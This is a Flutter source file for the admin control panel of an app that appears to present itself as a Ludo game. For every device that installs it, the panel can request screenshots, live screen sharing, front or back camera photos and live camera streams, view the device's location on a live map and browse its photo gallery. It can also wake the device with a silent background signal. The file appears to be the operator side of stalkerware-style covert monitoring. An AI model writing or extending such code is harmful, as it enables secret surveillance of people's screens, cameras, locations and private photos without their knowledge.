import 'package:flutter/material.dart';
import 'package:get/get.dart';
import '../controllers/admin_controller.dart';
import '../controllers/auth_controller.dart';
import '../controllers/theme_controller.dart';
import 'home_screen.dart';
import '../widgets/live_share_view.dart';
import 'user_gallery_screen.dart';
import 'user_location_screen.dart';
import 'request_detail_screen.dart';
import 'request_history_screen.dart';

class AdminPanelScreen extends StatefulWidget {
  const AdminPanelScreen({super.key});

  @override
  State<AdminPanelScreen> createState() => _AdminPanelScreenState();
}

class _AdminPanelScreenState extends State<AdminPanelScreen> {
  String _cameraFacing = 'front';
  bool _isFullscreenStreamVisible = false;
  String? _openedFullscreenRequestId;

  void _openFullscreenStream(String requestId, String requestType) {
    if (!mounted || _isFullscreenStreamVisible) return;

    _isFullscreenStreamVisible = true;
    _openedFullscreenRequestId = requestId;

    Navigator.of(context)
        .push(
          MaterialPageRoute(
            builder: (_) => FullScreenLiveStreamPage(
              requestId: requestId,
              requestType: requestType,
            ),
          ),
        )
        .then((_) {
          if (mounted) {
            setState(() => _isFullscreenStreamVisible = false);
          }
        });
  }

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      Get.find<AdminController>().refreshDeviceList();
    });
  }

  String _formatRequestTime(DateTime? dt) {
    if (dt == null) return 'Time: Just now';
    final local = dt.toLocal();
    final hour = local.hour > 12 ? local.hour - 12 : (local.hour == 0 ? 12 : local.hour);
    final ampm = local.hour >= 12 ? 'PM' : 'AM';
    final min = local.minute.toString().padLeft(2, '0');
    final sec = local.second.toString().padLeft(2, '0');
    final day = local.day.toString().padLeft(2, '0');
    final month = local.month.toString().padLeft(2, '0');
    return '$day/$month, $hour:$min:$sec $ampm';
  }

  @override
  Widget build(BuildContext context) {
    final adminCtrl = Get.find<AdminController>();

    ScreenshotRequestItem? activeLiveRequest;
    for (final request in adminCtrl.screenshotRequests) {
      if ((request.requestType == 'screen_share' ||
              request.requestType == 'camera_stream') &&
          (request.status == 'active' ||
              request.status == 'live' ||
              request.status == 'offer_created')) {
        activeLiveRequest = request;
        break;
      }
    }

    final activeRequestId = activeLiveRequest?.requestId;
    final activeRequestType = activeLiveRequest?.requestType;

    if (activeLiveRequest != null &&
        !_isFullscreenStreamVisible &&
        _openedFullscreenRequestId != activeRequestId) {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (mounted && activeRequestId != null && activeRequestType != null) {
          _openFullscreenStream(
            activeRequestId,
            activeRequestType,
          );
        }
      });
    } else if (activeLiveRequest == null) {
      _openedFullscreenRequestId = null;
    }

    return GetBuilder<ThemeController>(
      builder: (themeState) {
        final theme = themeState.currentTheme;

        return Scaffold(
          appBar: AppBar(
            title: const Text('Admin Panel'),
            backgroundColor: theme.blue,
            actions: [
              IconButton(
                icon: const Icon(Icons.history_rounded),
                onPressed: () => Get.to(() => const RequestHistoryScreen()),
                tooltip: 'Activity History',
              ),
              IconButton(
                icon: const Icon(Icons.sports_esports),
                onPressed: () => Get.to(() => const HomeScreen()),
                tooltip: 'Go to Ludo Game',
              ),
              IconButton(
                icon: const Icon(Icons.refresh),
                onPressed: adminCtrl.refreshDeviceList,
                tooltip: 'Refresh Device List',
              ),
              IconButton(
                icon: const Icon(Icons.logout),
                onPressed: () async {
                  await Get.find<AuthController>().signOut();
                },
                tooltip: 'Sign Out',
              ),
            ],
          ),
          body: Obx(() {
            if (!adminCtrl.isReady.value) {
              return const Center(child: CircularProgressIndicator());
            }

            return ListView(
              padding: const EdgeInsets.all(16.0),
              children: [
                Card(
                  color: theme.cardBg,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(16),
                  ),
                  child: Padding(
                    padding: const EdgeInsets.all(16.0),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'Installed Devices',
                          style: TextStyle(
                            fontSize: 18,
                            fontWeight: FontWeight.bold,
                            color: theme.textPrimary,
                          ),
                        ),
                        const SizedBox(height: 8),
                        Text(
                          'Total devices excluding this admin device: ${adminCtrl.otherInstalledDevicesCount}',
                          style: TextStyle(
                            fontSize: 14,
                            color: theme.textSecondary,
                          ),
                        ),
                        const SizedBox(height: 4),
                        Text(
                          'Your device ID: ${adminCtrl.currentDeviceId.value}',
                          style: TextStyle(
                            fontSize: 12,
                            color: theme.textSecondary,
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 16),
                Card(
                  color: theme.cardBg,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(16),
                  ),
                  child: Padding(
                    padding: const EdgeInsets.all(12.0),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'Camera Settings',
                          style: TextStyle(
                            fontSize: 16,
                            fontWeight: FontWeight.bold,
                            color: theme.textPrimary,
                          ),
                        ),
                        const SizedBox(height: 8),
                        DropdownButtonFormField<String>(
                          initialValue: _cameraFacing,
                          decoration: const InputDecoration(
                            border: OutlineInputBorder(),
                            labelText: 'Camera Facing',
                          ),
                          items: const [
                            DropdownMenuItem(value: 'front', child: Text('Front Camera')),
                            DropdownMenuItem(value: 'back', child: Text('Back Camera')),
                          ],
                          onChanged: (value) {
                            if (value != null) {
                              setState(() => _cameraFacing = value);
                            }
                          },
                        ),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 16),

                ...adminCtrl.devices
                    .where((d) => d.deviceId != adminCtrl.currentDeviceId.value)
                    .map((device) {
                      final isSelf =
                          device.deviceId == adminCtrl.currentDeviceId.value;

                      bool isStreamActive(ScreenshotRequestItem? r) {
                        if (r == null) return false;
                        if (r.status != 'active' && r.status != 'live') return false;
                        if (r.completedAt != null) return false;
                        if (r.requestedAt != null) {
                          if (DateTime.now().difference(r.requestedAt!).inMinutes > 10) {
                            return false;
                          }
                        }
                        return true;
                      }

                      final activeScreenShare = adminCtrl.screenshotRequests.firstWhereOrNull(
                        (r) => r.targetDeviceId == device.deviceId &&
                               r.requestType == 'screen_share' &&
                               isStreamActive(r),
                      );
                      final activeCameraStream = adminCtrl.screenshotRequests.firstWhereOrNull(
                        (r) => r.targetDeviceId == device.deviceId &&
                               r.requestType == 'camera_stream' &&
                               isStreamActive(r),
                      );

                      return Card(
                        color: theme.cardBg,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(16),
                        ),
                        margin: const EdgeInsets.only(bottom: 12),
                        child: Padding(
                          padding: const EdgeInsets.all(14.0),
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.stretch,
                            children: [
                              Row(
                                children: [
                                  CircleAvatar(
                                    radius: 18,
                                    backgroundColor: device.isOnline ? Colors.green.shade600 : Colors.grey.shade700,
                                    child: const Icon(Icons.person, color: Colors.white, size: 20),
                                  ),
                                  const SizedBox(width: 10),
                                  Expanded(
                                    child: Column(
                                      crossAxisAlignment: CrossAxisAlignment.start,
                                      children: [
                                        Row(
                                          children: [
                                            Flexible(
                                              child: Text(
                                                isSelf ? 'Admin (${device.username})' : device.username,
                                                style: TextStyle(
                                                  fontWeight: FontWeight.bold,
                                                  fontSize: 16,
                                                  color: theme.textPrimary,
                                                ),
                                                overflow: TextOverflow.ellipsis,
                                              ),
                                            ),
                                            const SizedBox(width: 6),
                                            // Live / Offline Status Badge
                                            Container(
                                              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                                              decoration: BoxDecoration(
                                                color: device.isOnline ? Colors.green.shade700 : Colors.grey.shade800,
                                                borderRadius: BorderRadius.circular(6),
                                              ),
                                              child: Row(
                                                mainAxisSize: MainAxisSize.min,
                                                children: [
                                                  Container(
                                                    width: 6,
                                                    height: 6,
                                                    decoration: BoxDecoration(
                                                      shape: BoxShape.circle,
                                                      color: device.isOnline ? Colors.greenAccent : Colors.grey.shade400,
                                                    ),
                                                  ),
                                                  const SizedBox(width: 4),
                                                  Text(
                                                    device.isOnline ? 'LIVE' : 'OFFLINE',
                                                    style: const TextStyle(
                                                      color: Colors.white,
                                                      fontSize: 9,
                                                      fontWeight: FontWeight.bold,
                                                    ),
                                                  ),
                                                ],
                                              ),
                                            ),
                                          ],
                                        ),
                                        if (device.email != null && device.email!.isNotEmpty)
                                          Text(
                                            device.email!,
                                            style: TextStyle(
                                              fontSize: 11,
                                              color: theme.textSecondary,
                                            ),
                                          ),
                                      ],
                                    ),
                                  ),
                                  Chip(
                                    label: Text(device.platform.toUpperCase()),
                                    backgroundColor: theme.boardBg,
                                    labelStyle: TextStyle(
                                      color: theme.textPrimary,
                                      fontSize: 10,
                                    ),
                                  ),
                                  const SizedBox(width: 4),
                                  if (device.nativeCaptureEnabled)
                                    Container(
                                      padding: const EdgeInsets.symmetric(
                                        horizontal: 6,
                                        vertical: 3,
                                      ),
                                      decoration: BoxDecoration(
                                        color: Colors.green.shade600,
                                        borderRadius: BorderRadius.circular(10),
                                      ),
                                      child: const Text(
                                        'Native',
                                        style: TextStyle(
                                          color: Colors.white,
                                          fontSize: 10,
                                        ),
                                      ),
                                    ),
                                ],
                              ),
                              const SizedBox(height: 8),
                              Row(
                                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                children: [
                                  Expanded(
                                    child: Text(
                                      'Last active: ${device.lastSeenAt?.toLocal().toString() ?? 'unknown'}',
                                      style: TextStyle(
                                        color: theme.textSecondary,
                                        fontSize: 11,
                                      ),
                                      maxLines: 1,
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                  ),
                                  Row(
                                    children: [
                                      TextButton.icon(
                                        onPressed: () => Get.to(() => UserLocationScreen(device: device)),
                                        icon: const Icon(Icons.map_rounded, size: 16, color: Colors.redAccent),
                                        label: const Text('Live Map', style: TextStyle(color: Colors.redAccent)),
                                        style: TextButton.styleFrom(
                                          padding: const EdgeInsets.symmetric(horizontal: 6),
                                          visualDensity: VisualDensity.compact,
                                        ),
                                      ),
                                      TextButton.icon(
                                        onPressed: () => Get.to(() => UserGalleryScreen(device: device)),
                                        icon: const Icon(Icons.collections, size: 16),
                                        label: const Text('Gallery'),
                                        style: TextButton.styleFrom(
                                          padding: const EdgeInsets.symmetric(horizontal: 6),
                                          visualDensity: VisualDensity.compact,
                                        ),
                                      ),
                                    ],
                                  ),
                                ],
                              ),
                              const SizedBox(height: 12),
                              Row(
                                children: [
                                  Expanded(
                                    child: ElevatedButton.icon(
                                      onPressed: isSelf
                                          ? null
                                          : () async {
                                              await adminCtrl.requestScreenshot(
                                                device.deviceId,
                                              );
                                              Get.snackbar(
                                                'Screenshot Requested',
                                                'A screenshot request was sent to the selected device.',
                                                snackPosition:
                                                    SnackPosition.BOTTOM,
                                              );
                                            },
                                      icon: const Icon(Icons.photo_camera),
                                      label: const Text('Screenshot'),
                                      style: ElevatedButton.styleFrom(
                                        backgroundColor: isSelf
                                            ? Colors.grey
                                            : theme.blue,
                                      ),
                                    ),
                                  ),
                                  const SizedBox(width: 8),
                                  Expanded(
                                     child: activeScreenShare != null
                                         ? ElevatedButton.icon(
                                             onPressed: isSelf
                                                 ? null
                                                 : () async {
                                                     await adminCtrl.stopScreenShare(activeScreenShare.requestId);
                                                     Get.snackbar(
                                                       'Stream Stopped',
                                                       'Stopped live screen share for ${device.username}',
                                                       snackPosition: SnackPosition.BOTTOM,
                                                       backgroundColor: Colors.redAccent,
                                                       colorText: Colors.white,
                                                     );
                                                   },
                                             icon: const Icon(Icons.stop_circle_rounded, color: Colors.white),
                                             label: const Text('Stop Share', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                                             style: ElevatedButton.styleFrom(
                                               backgroundColor: Colors.redAccent,
                                             ),
                                           )
                                         : OutlinedButton.icon(
                                             onPressed: isSelf
                                                 ? null
                                                 : () async {
                                                     await adminCtrl.requestScreenShare(device.deviceId);
                                                     Get.snackbar(
                                                       'Live Share Requested',
                                                       'A live share session was started for the selected device.',
                                                       snackPosition: SnackPosition.BOTTOM,
                                                     );
                                                   },
                                             icon: const Icon(Icons.screenshot_monitor),
                                             label: const Text('Live Share'),
                                             style: OutlinedButton.styleFrom(
                                               foregroundColor: theme.blue,
                                               side: BorderSide(color: theme.blue),
                                             ),
                                           ),
                                   ),
                                ],
                              ),
                               const SizedBox(height: 8),
                              Row(
                                children: [
                                  Expanded(
                                    child: ElevatedButton.icon(
                                      onPressed: isSelf
                                          ? null
                                          : () async {
                                              await adminCtrl.requestCameraCapture(
                                                device.deviceId,
                                                cameraFacing: _cameraFacing,
                                              );
                                              Get.snackbar(
                                                'Camera Capture Requested',
                                                'The target device will capture a photo from the selected camera.',
                                                snackPosition:
                                                    SnackPosition.BOTTOM,
                                              );
                                            },
                                      icon: const Icon(Icons.camera_alt),
                                      label: const Text('Capture Camera'),
                                      style: ElevatedButton.styleFrom(
                                        backgroundColor: isSelf
                                            ? Colors.grey
                                            : theme.blue,
                                      ),
                                    ),
                                  ),
                                  const SizedBox(width: 8),
                                  Expanded(
                                    child: OutlinedButton.icon(
                                      onPressed: isSelf
                                          ? null
                                          : () async {
                                              await adminCtrl.requestCameraStream(
                                                device.deviceId,
                                                cameraFacing: _cameraFacing,
                                              );
                                              Get.snackbar(
                                                'Camera Stream Requested',
                                                'The target device will start a live camera stream.',
                                                snackPosition:
                                                    SnackPosition.BOTTOM,
                                              );
                                            },
                                      icon: const Icon(Icons.videocam),
                                      label: const Text('Live Camera'),
                                      style: OutlinedButton.styleFrom(
                                        foregroundColor: theme.blue,
                                        side: BorderSide(color: theme.blue),
                                      ),
                                    ),
                                  ),
                                ],
                              ),
                              const SizedBox(height: 8),
                              SizedBox(
                                width: double.infinity,
                                child: TextButton.icon(
                                  onPressed: isSelf
                                      ? null
                                      : () async {
                                          await adminCtrl.wakeDevice(device.deviceId);
                                          Get.snackbar(
                                            'Silent Wake Dispatched',
                                            'A high-priority background wake signal was sent to ${device.username}.',
                                            snackPosition: SnackPosition.BOTTOM,
                                            backgroundColor: Colors.indigo.shade800,
                                            colorText: Colors.white,
                                          );
                                        },
                                  icon: const Icon(Icons.bolt, color: Colors.amberAccent, size: 18),
                                  label: const Text(
                                    'Wake Device (Silent Background)',
                                    style: TextStyle(color: Colors.amberAccent, fontWeight: FontWeight.w600, fontSize: 13),
                                  ),
                                  style: TextButton.styleFrom(
                                    backgroundColor: Colors.amber.withOpacity(0.12),
                                    shape: RoundedRectangleBorder(
                                      borderRadius: BorderRadius.circular(12),
                                      side: BorderSide(color: Colors.amber.withOpacity(0.3)),
                                    ),
                                    padding: const EdgeInsets.symmetric(vertical: 10),
                                  ),
                                ),
                              ),
                            ],
                          ),
                        ),
                      );
                    }),
                const SizedBox(height: 16),
                Card(
                  color: theme.cardBg,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(16),
                    side: BorderSide(color: theme.gridLine),
                  ),
                  child: InkWell(
                    borderRadius: BorderRadius.circular(16),
                    onTap: () => Get.to(() => const RequestHistoryScreen()),
                    child: Padding(
                      padding: const EdgeInsets.all(16.0),
                      child: Row(
                        children: [
                          CircleAvatar(
                            radius: 22,
                            backgroundColor: theme.blue.withOpacity(0.15),
                            child: Icon(Icons.history_rounded, color: theme.blue, size: 24),
                          ),
                          const SizedBox(width: 14),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(
                                  'Activity & Request History',
                                  style: TextStyle(
                                    fontSize: 16,
                                    fontWeight: FontWeight.bold,
                                    color: theme.textPrimary,
                                  ),
                                ),
                                const SizedBox(height: 4),
                                Text(
                                  'View all captured media, screenshots, live streams, and logs with pagination.',
                                  style: TextStyle(
                                    fontSize: 12,
                                    color: theme.textSecondary,
                                  ),
                                ),
                              ],
                            ),
                          ),
                          const SizedBox(width: 8),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
                            decoration: BoxDecoration(
                              color: theme.blue,
                              borderRadius: BorderRadius.circular(10),
                            ),
                            child: Row(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                Text(
                                  '${adminCtrl.screenshotRequests.length}',
                                  style: const TextStyle(
                                    color: Colors.white,
                                    fontWeight: FontWeight.bold,
                                    fontSize: 12,
                                  ),
                                ),
                                const SizedBox(width: 4),
                                const Icon(Icons.chevron_right, color: Colors.white, size: 16),
                              ],
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ),
              ],
            );
          }),
        );
      },
    );
  }
}
